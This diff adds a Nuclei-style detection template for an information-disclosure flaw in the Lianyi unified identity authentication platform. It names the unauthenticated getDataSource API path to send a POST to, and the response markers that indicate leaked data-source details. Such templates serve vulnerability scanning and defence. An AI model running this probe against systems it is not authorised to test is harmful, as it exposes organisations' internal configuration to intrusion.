@@ -1,0 +1,30 @@
+id: poc-yaml-ly-sky-getdatasource-info-leak
+info:
+  name: 联奕统一身份认证平台 getDataSource 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/bd-mdp/serviceManager/outInterface/getDataSource"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "ly-gateway-server-svc:1101"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "\"ip\":"
+          - "\"data\":"
